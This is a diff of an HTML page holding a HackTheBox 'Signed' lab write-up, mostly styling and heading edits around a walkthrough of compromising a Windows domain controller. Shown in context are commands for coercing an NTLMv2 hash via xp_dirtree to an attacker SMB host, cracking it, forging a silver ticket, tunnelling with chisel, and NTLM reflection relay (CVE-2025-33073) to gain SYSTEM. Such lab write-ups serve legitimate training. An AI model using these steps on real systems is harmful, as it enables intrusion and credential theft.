@@ -22,126 +22,147 @@
         .neon-pink { text-shadow: 0 0 15px #ec4899, 0 0 30px #ec4899; }
         .neon-cyan { text-shadow: 0 0 15px #67e8f9, 0 0 30px #67e8f9; }
 
-
-        .prose { 
-            color: #e2e8f0; 
-            max-width: 100%; 
+        .prose {
+            color: #f1f5f9;
+            max-width: 100%;
         }
-        .prose p, .prose li, .prose td { 
-            font-size: 1.15rem; 
-            line-height: 1.85; 
-            color: #cbd5e1; 
-        }
-
-        .prose h1 { 
-            font-size: 3.2rem; 
-            color: #ec4899; 
-            text-shadow: 0 0 25px #ec4899, 0 0 40px #ec4899; 
-            font-family: 'Space Grotesk', sans-serif; 
-            margin-top: 2.5rem; 
-            margin-bottom: 1.25rem; 
-        }
-        .prose h2 { 
-            font-size: 2.6rem; 
-            color: #67e8f9; 
-            text-shadow: 0 0 20px #67e8f9, 0 0 35px #67e8f9; 
-            font-family: 'Space Grotesk', sans-serif; 
-            margin-top: 3rem; 
-            margin-bottom: 1rem; 
-        }
-        .prose h3 { 
-            font-size: 2.1rem; 
-            color: #ec4899; 
-            text-shadow: 0 0 15px #ec4899, 0 0 30px #ec4899; 
-            font-family: 'Space Grotesk', sans-serif; 
-            margin-top: 2.75rem; 
-            margin-bottom: 0.75rem; 
-        }
-        .prose h4, .prose h5, .prose h6 { 
-            font-size: 1.75rem; 
-            color: #67e8f9; 
-            font-family: 'Space Grotesk', sans-serif; 
-            margin-top: 2.5rem; 
+        .prose p, .prose li, .prose td {
+            font-size: 1.15rem;
+            line-height: 1.85;
+            color: #f1f5f9;
         }
 
-        .prose ul, .prose ol { 
-            list-style: none; 
-            padding-left: 0; 
+
+        .prose h1 {
+            font-size: 3.2rem;
+            color: #f1f5f9;
+            font-weight: 700;
+            text-shadow: 0 0 30px #ec4899, 0 0 50px #ec4899;
+            font-family: 'Space Grotesk', sans-serif;
+            margin-top: 2.5rem;
+            margin-bottom: 1.25rem;
         }
-        .prose ul li, .prose ol li { 
-            position: relative; 
-            padding-left: 2rem; 
-            margin-bottom: 0.75rem; 
+        .prose h2 {
+            font-size: 2.6rem;
+            color: #f1f5f9;
+            font-weight: 600;
+            text-shadow: none;
+            font-family: 'Space Grotesk', sans-serif;
+            margin-top: 3rem;
+            margin-bottom: 1rem;
         }
-        .prose ul li::before, .prose ol li::before { 
-            content: "♦"; 
-            position: absolute; 
-            left: 0; 
-            color: #ec4899; 
-            font-size: 1.4rem; 
+        .prose h3 {
+            font-size: 2.1rem;
+            color: #f1f5f9;
+            font-weight: 600;
+            text-shadow: none;
+            font-family: 'Space Grotesk', sans-serif;
+            margin-top: 2.75rem;
+            margin-bottom: 0.75rem;
+        }
+        .prose h4, .prose h5, .prose h6 {
+            font-size: 1.75rem;
+            color: #f1f5f9;
+            font-weight: 500;
+            text-shadow: none;
+            font-family: 'Space Grotesk', sans-serif;
+            margin-top: 2.5rem;
+            margin-bottom: 0.75rem;
         }
 
-        .prose table { 
-            width: 100%; 
-            border-collapse: collapse; 
-            margin: 2rem 0; 
-            border-radius: 16px; 
-            overflow: hidden; 
-            background: #18181b; 
+        
+        .prose ul, .prose ol {
+            list-style: none;
+            padding-left: 0;
         }
-        .prose th, .prose td { 
-            padding: 1rem 1.25rem; 
-            border-bottom: 2px solid #3b0764; 
+        .prose ul li, .prose ol li {
+            position: relative;
+            padding-left: 2rem;
+            margin-bottom: 0.75rem;
         }
-        .prose th { 
-            background: #4c1d95; 
-            color: #e0f2fe; 
-            font-weight: 700; 
+        .prose ul li::before, .prose ol li::before {
+            content: "♦";
+            position: absolute;
+            left: 0;
+            color: #ec4899;
+            font-size: 1.4rem;
         }
-        .prose tr:nth-child(even) { 
-            background: #27272a; 
+        
+        .prose ul ul, .prose ol ul,
+        .prose ul ol, .prose ol ol {
+            padding-left: 3rem;   /* stronger indentation for nested levels */
         }
-
-        .prose pre { 
-            background: #18181b; 
-            padding: 1.75rem; 
-            border-radius: 20px; 
-            overflow-x: auto; 
-            border: 4px solid #67e8f9; 
-            box-shadow: 0 0 25px -10px #67e8f9; 
-            font-size: 0.95rem; 
-            line-height: 1.6; 
-            margin-top: 2.5rem; 
-            margin-bottom: 2.5rem; 
-        }
-        .prose code { 
-            font-family: ui-monospace, monospace; 
-            color: #e0f2fe; 
+        .prose ul ul ul, .prose ol ul ul,
+        .prose ul ol ul, .prose ol ol ul {
+            padding-left: 4rem;   /* even deeper nesting */
         }
 
-        .prose a { 
-            color: #67e8f9; 
-            text-decoration: underline; 
-            text-underline-offset: 4px; 
+
+        .prose table {
+            width: 100%;
+            border-collapse: collapse;
+            margin: 2rem 0;
+            border-radius: 16px;
+            overflow: hidden;
+            background: #18181b;
         }
-        .prose a:hover { 
-            color: #ec4899; 
+        .prose th, .prose td {
+            padding: 1rem 1.25rem;
+            border-bottom: 2px solid #3b0764;
+        }
+        .prose th {
+            background: #4c1d95;
+            color: #e0f2fe;
+            font-weight: 700;
+        }
+        .prose tr:nth-child(even) {
+            background: #27272a;
         }
 
-        .prose img { 
-            max-width: 100%; 
-            border-radius: 20px; 
-            margin: 2.5rem 0; 
-            box-shadow: 0 15px 25px -10px #ec4899; 
+
+        .prose pre {
+            background: rgb(24 24 27 / 0.7);
+            padding: 1.75rem;
+            border-radius: 20px;
+            overflow-x: auto;
+            border: 1px solid #ec4899;
+            box-shadow: 0 0 25px -10px #ec4899;
+            font-size: 0.95rem;
+            line-height: 1.6;
+            margin-top: 2.5rem;
+            margin-bottom: 2.5rem;
+        }
+        .prose code {
+            font-family: ui-monospace, monospace;
+            color: #67e8f9;
         }
 
-        .prose blockquote { 
-            border-left: 6px solid #ec4899; 
-            padding-left: 1.5rem; 
-            color: #cbd5e1; 
-            background: #27272a; 
-            border-radius: 0 12px 12px 0; 
-            padding: 1.25rem; 
+        .prose a {
+            color: #67e8f9;
+            text-decoration: underline;
+            text-underline-offset: 4px;
+        }
+        .prose a:hover {
+            color: #ec4899;
+        }
+
+
+        .prose img {
+            max-width: 100%;
+            border-radius: 20px;
+            margin: 2.5rem 0;
+            border: 1px solid #ec4899;
+            box-shadow: 0 15px 25px -10px #ec4899;
+        }
+
+
+        .prose blockquote {
+            border-left: 6px solid #ec4899;
+            padding-left: 1.5rem;
+            color: #f1f5f9;
+            background: #27272a;
+            border-radius: 0 12px 12px 0;
+            padding: 1.25rem;
         }
     </style>
 </head>
@@ -154,36 +175,27 @@
                     <span class="logo-font text-3xl font-bold tracking-tighter neon-white">LABS</span>
                 </div>
             </a>
-
             <div class="hidden md:flex items-center gap-8 text-sm font-medium">
-                <a href="../index.html" class="text-pink-400 transition-colors">HOME</a>
-                <a href="./" class="hover:text-pink-400 transition-colors">HACKTHEBOX</a>
+                <a href="../index.html" class="hover:text-pink-400 transition-colors">HOME</a>
+                <a href="./" class="text-pink-400 transition-colors">HACKTHEBOX</a>
                 <a href="../blueteam/" class="hover:text-pink-400 transition-colors">BLUE TEAM &amp; SHERLOCKS</a>
                 <a href="../threatintel/" class="hover:text-pink-400 transition-colors">THREAT INTEL</a>
             </div>
         </div>
     </nav>
 
-    <div class="max-w-7xl mx-auto px-6 pt-28 pb-12">   
+    <div class="max-w-7xl mx-auto px-6 pt-28 pb-12">
         <a href="./" class="text-pink-400 hover:text-pink-500 mb-8 inline-flex items-center gap-2 text-sm font-medium">
             ← Back to HackTheBox Library
         </a>
-        
+       
         <div class="flex items-center gap-4 text-xs text-zinc-400 mb-6">
             <span class="px-4 py-1 bg-pink-900 text-pink-300 rounded-3xl font-mono tracking-widest">HACKTHEBOX</span>
         </div>
 
-        <div class="article-frame">
+        <div class="prose">
             <h1 class="text-5xl font-bold logo-font tracking-tighter neon-pink mb-6">Signed</h1>
-            
-            <div class="prose">
-                <div class="w-96 h-auto mx-auto">  
-                    <img 
-                        src="images/signed.jpg" 
-                        class="w-full h-auto object-cover rounded-xl shadow-2xl"
-                        alt="HackTheBox Signed "
-                   >
-                </div>
+
 <h2>Summary</h2>
 <p>Signed is a Windows HackTheBox machine and as is common in real life Windows penetration tests, we will start the Signed box with credentials for the following account which can be used to access the MSSQL service: </p>
 <pre><code>scott / Sm230#C5NatH
@@ -201,7 +213,7 @@ PORT     STATE SERVICE
 Nmap done: 1 IP address (1 host up) scanned in 38.29 seconds
 </code></pre>
 <p>From the Nmap output we have only one port open, the 1433 relative to MSSQL.</p>
-<h3>Access enumeration</h3>
+<h3>Mssql enumeration</h3>
 <p>With the credentials provided we will test them for mssql using netexec. <br />
 When testing for mssql access we have to try even with local-auth flag, because without this flag, the login will come from an untrusted domain and the connection will fail.</p>
 <pre><code>└─$ nxc mssql 10.129.242.173 -u scott  -p 'Sm230#C5NatH' 
@@ -212,7 +224,6 @@ MSSQL       10.129.242.173  1433   DC01             [-] SIGNED.HTB\scott:Sm230#C
 MSSQL       10.129.242.173  1433   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:SIGNED.HTB)
 MSSQL       10.129.242.173  1433   DC01             [+] DC01\scott:Sm230#C5NatH 
 </code></pre>
-<h2>MSSQL ENUMERATION as User SCOTT</h2>
 <p>We will access the MSSQL service with impacket and enumerate our user and our permissions, and the user that we can impersonate.</p>
 <pre><code>└─$ impacket-mssqlclient scott@10.129.242.173                             
 Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
@@ -228,18 +239,10 @@ Password:
 [!] Press help for extra shell commands
 SQL (scott  guest@master)&gt; 
 </code></pre>
-<h3>Verifying our Current User and Role</h3>
+<h4>Verifying our Current User and Role</h4>
 <pre><code>SQL (scott  guest@master)&gt; SELECT SYSTEM_USER SELECT IS_SRVROLEMEMBER('sysadmin');
 </code></pre>
-                <div class="w-full h-full object-cover">  
-                    <img 
-                        src="images/mssql1.jpg" 
-                        class="w-full h-auto object-cover rounded-xl shadow-2xl"
-                        alt="HackTheBox Signed "
-                   >
-                </div>
-<p>From the output above we see that the flag is set to 0, so the user scott isn't an Admin.</p>
-<h3>Identify Users that We Can Impersonate</h3>
+<h4>Identify Users that We Can Impersonate</h4>
 <pre><code>SQL (scott  guest@master)&gt; SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE'
 name   
 ----   
@@ -248,10 +251,10 @@ SQL (scott  guest@master)&gt;
 <p>The user scott doesn't has the IMPERSONATE permission on any user.</p>
 <p>So far we don't have any permission.  </p>
 <h3>Stealing the Hash of the MSSQL Service Account</h3>
-<p>We can try steal the MSSQL service account hash using <code>xp_subdirs</code> or <code>xp_dirtree</code> undocumented stored procedures, which use the SMB protocol to retrieve a list of child directories under a specified parent directory from the file system. When we use one of these stored procedures and point it to our SMB server, the directory listening functionality will force the server to authenticate and send the NTLMv2 hash of the service account that is running the SQL Server. We need first top start Responder.</p>
+<p>We can try steal the MSSQL service account hash using <code>xp_subdirs</code> or <code>xp_dirtree</code>.. When we use one of these stored procedures and point it to our SMB server, the directory listening functionality will force the server to authenticate and send the NTLMv2 hash of the service account that is running the SQL Server. We need first top start Responder.</p>
 <pre><code>└─$ sudo responder -I tun0  
 </code></pre>
-<p>The we execute xp_dirtree on the MSSQL service.</p>
+<p>Then we execute xp_dirtree on the MSSQL service.</p>
 <pre><code>SQL (scott  guest@master)&gt; EXEC master..xp_dirtree '\\10.10.15.204\share\'
 </code></pre>
 <p>And we got the hash of the mssqlsvc service account.</p>
@@ -282,7 +285,7 @@ Hash.Mode........: 5600 (NetNTLMv2)
 Hash.Target......: MSSQLSVC::SIGNED:3269435dd2b173fc:ad487919e1aefd747...000000
 &lt;SNIP&gt;
 </code></pre>
-<h2>MSSQL ENUMERATION as User MSSQLSVC</h2>
+<h3>Mssql Enumeration as User Mssqlsvc</h3>
 <pre><code>└─$ impacket-mssqlclient mssqlsvc@10.129.242.173             
 Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
 
@@ -305,26 +308,26 @@ Password:
 [!] Press help for extra shell commands
 SQL (SIGNED\mssqlsvc  guest@master)&gt; 
 </code></pre>
-<h3>Identify Users that We Can Impersonate</h3>
+<h4>Identify Users that We Can Impersonate</h4>
 <pre><code>SQL (SIGNED\mssqlsvc  guest@master)&gt; SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE';
 name   
 ---- 
 </code></pre>
-<h3>Verifying our Current User and Role</h3>
+<h4>Verifying our Current User and Role</h4>
 <pre><code>SQL (SIGNED\mssqlsvc  guest@master)&gt; SELECT SYSTEM_USER SELECT IS_SRVROLEMEMBER('sysadmin');
 
 -----------   
 SIGNED\mssqlsvc   
           0 
 </code></pre>
-<p>Trying to enable xp_cmdshell</p>
+<h4>Trying to enable xp_cmdshell</h4>
 <pre><code>SQL (SIGNED\mssqlsvc  guest@master)&gt; enable_xp_cmdshell 
 ERROR(DC01): Line 105: User does not have permission to perform this action.
 ERROR(DC01): Line 1: You do not have permission to run the RECONFIGURE statement.
 ERROR(DC01): Line 62: The configuration option 'xp_cmdshell' does not exist, or it may be an advanced option.
 ERROR(DC01): Line 1: You do not have permission to run the RECONFIGURE statement.
 </code></pre>
-<p>Using the help command to see what other commands we can execute.</p>
+<h4>Using the help command to see what other commands we can execute.</h4>
 <pre><code>SQL (SIGNED\mssqlsvc  guest@master)&gt; help
 
     lcd {path}                 - changes the current local directory to {path}
@@ -349,8 +352,8 @@ ERROR(DC01): Line 1: You do not have permission to run the RECONFIGURE statement
     show_query                 - show query
     mask_query                 - mask query
 </code></pre>
-<p>So we have tried to enumerate the user permission, linked servers. We can try to enumerate the users present on the machine and logins.</p>
-<h3>Enumerating Users</h3>
+<p>We can try to enumerate the users present on the machine and logins.</p>
+<h4>Enumerating Users</h4>
 <pre><code>SQL (SIGNED\mssqlsvc  guest@master)&gt; enum_users
 UserName                            RoleName   LoginName                           DefDBName   DefSchemaName       UserID                                                                   SID                   
 ---------------------------------   --------   ---------------------------------   ---------   -------------   ----------   -------------------------------------------------------------------                   
@@ -361,7 +364,7 @@ guest                               public     NULL                             
 INFORMATION_SCHEMA                  public     NULL                                NULL        NULL            b'3         '                                                                  NULL                                          
 sys                                 public     NULL                                NULL        NULL            b'4         '                                                                  NULL 
 </code></pre>
-<h3>Enumerating Logins</h3>
+<h4>Enumerating Logins</h4>
 <pre><code>SQL (SIGNED\mssqlsvc  guest@master)&gt; enum_logins
 name                                type_desc       is_disabled   sysadmin   securityadmin   serveradmin   setupadmin   processadmin   diskadmin   dbcreator   bulkadmin   
 ---------------------------------   -------------   -----------   --------   -------------   -----------   ----------   ------------   ---------   ---------   ---------   
@@ -398,7 +401,7 @@ SIGNED\Domain Users                 WINDOWS_GROUP             0          0      
 <p>Because the MSSQL service trusts any ticket encrypted with its own service account hash, it accepted the forged ticket as valid. The service saw that the presented user belonged to the SIGNED\IT group, which is mapped to the <strong>sysadmin</strong> server role, granting us full administrative privileges on the database.</p>
 <h4>Why Silver Ticket was effective here:</h4>
 <ul>
-<li>We had already obtained the mssqlsvc account’s NTLM hash earlier.</li>
+<li>We can obtained the mssqlsvc account’s NTLM hash.</li>
 <li>Enumeration showed that the Windows group SIGNED\IT had sysadmin rights on the SQL server.</li>
 <li>This attack is more stealthy and requires fewer privileges than a Golden Ticket (which needs the KRBTGT hash), as it only targets one specific service.</li>
 </ul>
@@ -409,6 +412,7 @@ SIGNED\Domain Users                 WINDOWS_GROUP             0          0      
 <li>Add the RID of the IT group.</li>
 <li>The SQL service will see “this user is in SIGNED\IT”.</li>
 </ol>
+<p>Reference https://www.crowdstrike.com/en-us/cybersecurity-101/cyberattacks/silver-ticket-attack/</p>
 <p>Getting the RID of the user mssqlsvc (and is NTLM hash) and for the group SIGNED\IT, and the domain SID.</p>
 <ul>
 <li>Getting the NTLM HASH of the user mssqlsvc.</li>
@@ -448,7 +452,6 @@ Type &quot;help&quot;, &quot;copyright&quot;, &quot;credits&quot; or &quot;licen
 'S-1-5-21-4088429403-1159899800-2753317549-1105'
 &gt;&gt;&gt; 
 </code></pre>
-<p>So the RID is 1105.</p>
 <ul>
 <li>Forging the Silver Ticket.</li>
 </ul>
@@ -527,7 +530,7 @@ PS C:\Windows\system32&gt;
 <p>The NTLM reflection technique behind <strong>CVE-2025-33073</strong> exploits how Windows decides whether an SMB connection is “local” or “remote.”</p>
 <p>An attacker creates a <strong>malicious DNS record</strong> with a specially crafted name (a so-called <em>ghost SPN</em>) that looks like it belongs to the victim machine, but actually points to the attacker’s system. When the victim connects to that name, Windows is fooled into thinking it’s talking to itself.</p>
 <p>Because of this misclassification, the SMB client treats the connection as <strong>local</strong>, allowing authentication to proceed with <strong>high privileges (SYSTEM level)</strong>. This bypasses normal protections against NTLM reflection and lets the attacker <strong>relay the authentication and escalate privileges</strong>.<br />
-More on <a href="https://www.synacktiv.com/en/publications/relaying-kerberos-over-smb-using-krbrelayx">Relaying Kerberos over SMB using krbrelayx</a></p>
+Reference <a href="https://www.synacktiv.com/en/publications/relaying-kerberos-over-smb-using-krbrelayx">Relaying Kerberos over SMB using krbrelayx</a></p>
 <h4>Setting up proxychains and chisel.</h4>
 <pre><code>└─$ cat /etc/proxychains4.conf
 &lt;snip&gt;
@@ -558,7 +561,7 @@ PS C:\tools&gt; .\chisel.exe client 10.10.15.204:8000 R:socks
 10.129.242.173 [10.129.242.173] 445 (microsoft-ds) open : Operation now in progress
 </code></pre>
 <ol>
-<li>Add the required DNS record.( <a href="https://github.com/dirkjanm/krbrelayx/blob/master/dnstool.py">dnstool</a>)</li>
+<li>Add the required DNS record.(<a href="https://github.com/dirkjanm/krbrelayx/blob/master/dnstool.py">dnstool</a>)</li>
 </ol>
 <pre><code>└─$ git clone https://github.com/dirkjanm/krbrelayx
 
@@ -575,10 +578,7 @@ PS C:\tools&gt; .\chisel.exe client 10.10.15.204:8000 R:socks
 
 </code></pre>
 <ol>
-<li>Using nrlmrelayx to catch the authentication. We run impacket-ntlmrelayx from Impacket to catch the authentication and relay it into a WinRM-based shell with the following options:<ul>
-<li>-t winrms://DC01.signed.htb - The target of this attack is WinRM on HTTPS on DC01.</li>
-</ul>
-</li>
+<li>Using nrlmrelayx to catch the authentication. We run impacket-ntlmrelayx from Impacket to catch the authentication and relay it into a WinRM-based shell.</li>
 </ol>
 <pre><code>└─$ proxychains impacket-ntlmrelayx -t winrms://DC01.signed.htb -smb2support                                                                                      
 [proxychains] config file found: /etc/proxychains4.conf
@@ -676,7 +676,13 @@ Volume Serial Number is BED4-436E
 # type C:\Users\Administrator\Desktop\root.txt
 29f7278f92b6b**********
 </code></pre>
-            </div>
+                <div class="w-96 h-auto mx-auto">  
+                    <img 
+                        src="images/signed.jpg" 
+                        class="w-full h-auto object-cover rounded-xl shadow-2xl"
+                        alt="HackTheBox Signed "
+                   >
+                </div>
         </div>
 
         <div class="mt-16 pt-8 border-t border-zinc-700 text-xs text-zinc-400 flex justify-between font-medium">
